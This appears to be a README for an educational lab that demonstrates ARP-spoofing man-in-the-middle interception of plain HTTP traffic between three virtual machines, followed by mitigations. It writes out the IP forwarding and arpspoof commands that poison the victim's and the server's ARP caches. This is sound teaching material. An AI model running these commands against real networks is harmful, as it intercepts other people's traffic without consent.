# Man-in-the-Middle (MITM) Attack Lab using Wireshark

## Project Overview

This project demonstrates a **Man-in-the-Middle (MITM) attack** using **ARP spoofing** in a controlled virtual laboratory environment.

The objective is to show how an attacker can intercept and analyze **unencrypted HTTP traffic** between a victim machine and a web server using Wireshark.
---

## Objectives

- Set up a virtual network environment
- Configure communication between multiple machines
- Deploy an Apache web server
- Generate HTTP traffic
- Perform ARP spoofing attack
- Capture packets using Wireshark
- Analyze intercepted traffic
- Understand security risks of HTTP
- Learn mitigation techniques

---

## Laboratory Environment

| Machine     | Role       | OS           | IP Address      |
|-------------|------------|--------------|-----------------
| Kali Linux  | Attacker   | Kali Linux   | 192.168.244.129 |
| Debian      | Victim     | Debian Linux | 192.168.244.128 |
| Fedora      | Web Server | Fedora Linux | 192.168.244.131 |

---

##  Network Configuration

All machines are connected using VMware NAT network in the same subnet:

192.168.244.0/24

---

## Network Verification

Check IP addresses with "ip a" :

<img width="2649" height="1845" alt="Image" src="https://github.com/user-attachments/assets/a1c179da-8347-4762-b6de-882656598396" />


<img width="2562" height="1674" alt="Image" src="https://github.com/user-attachments/assets/3ac9c992-5e9f-4028-82dd-b0043ae70515" />


<img width="2715" height="1809" alt="Image" src="https://github.com/user-attachments/assets/d0c2f1cb-0ae7-4099-8027-0bcc166a41e2" />

Test connectivity:

ping 192.168.244.131

---

## Apache Web Server Setup (Fedora)

Install Apache:

sudo dnf install httpd -y

Start service:

sudo systemctl start httpd

Enable service:

sudo systemctl enable httpd

Allow HTTP traffic:

sudo firewall-cmd --permanent --add-service=http  
sudo firewall-cmd --reload

---

## Custom Web Page

sudo nano /var/www/html/index.html

Add:

<h1>Cybersecurity MITM Lab</h1>

---

## HTTP Test

On Fedora:

curl http://localhost

On Debian:

curl http://192.168.244.131

Expected output:

Cybersecurity MITM Lab

---

## Wireshark Capture

Start Wireshark on Kali:

sudo wireshark

Select interface:
eth0

Start capture.

---

## Generate Traffic

On Debian:

while true; do curl http://192.168.244.131; sleep 2; done

---

## Enable IP Forwarding (Kali)

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

---

## ARP Spoofing Attack

Terminal 1:

sudo arpspoof -i eth0 -t 192.168.244.128 192.168.244.131

Terminal 2:

sudo arpspoof -i eth0 -t 192.168.244.131 192.168.244.128

---

## Wireshark Analysis

Filter:

http  
or  
tcp.port == 80

You will see:
- HTTP GET requests
- HTTP responses
- Packet interception

---

## Follow HTTP Stream

Right click packet → Follow → HTTP Stream

Example request:

GET / HTTP/1.1  
Host: 192.168.244.131

Response:

Cybersecurity MITM Lab

---

## Security Risks

HTTP is insecure because it is transmitted in plaintext.

An attacker can:
- Intercept traffic
- Read data
- Modify requests
- Capture sensitive information

---

## Mitigation Techniques

- Use HTTPS (TLS encryption)
- Use VPN connections
- Enable ARP inspection
- Network segmentation

---

## Tools Used

- Kali Linux
- Debian Linux
- Fedora Linux
- Wireshark
- arpspoof (dsniff)
- Apache HTTP Server
- VMware Workstation

---

## Author

Project created for cybersecurity educational purposes in a controlled laboratory environment.

All activities were performed legally in isolated virtual machines.
